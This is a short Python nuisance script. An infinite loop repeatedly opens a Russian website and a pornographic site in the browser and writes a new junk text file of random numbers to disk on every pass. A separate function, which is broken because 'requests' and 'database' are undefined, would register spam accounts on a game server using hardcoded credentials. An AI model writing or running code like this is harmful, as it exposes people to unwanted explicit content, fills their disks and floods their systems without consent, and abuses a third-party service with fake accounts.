import webbrowser
import random
import os

def createAcc():
    endpoint = database
    data = {
        'userName': "NanoBanano", 
        'password': "Deezalirlox", 
        'email': "sungang"+str(random.randint(111111111,9999999999999999999999))+"@sungang.ru", 
        'secret': 'Wmfv3899gc9',    
        'statsupd': "top1"
    }
    headers = {'User-Agent': ''}
    r = requests.post(endpoint+"/accounts/registerGJAccount.php", data=data, headers=headers)
    return r.text
    
while True:
    webbrowser.open("https://sungang.ru")
    webbrowser.open("https://xvideos.com/")
    spam = open("SunGang"+str(random.randint(0,9999999999))+".txt", "w")
    spam.write(str(random.randint(111111111,9999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999))+"\n"+str(random.randint(111111111,99999999999999999999999)))
    print("botted")
    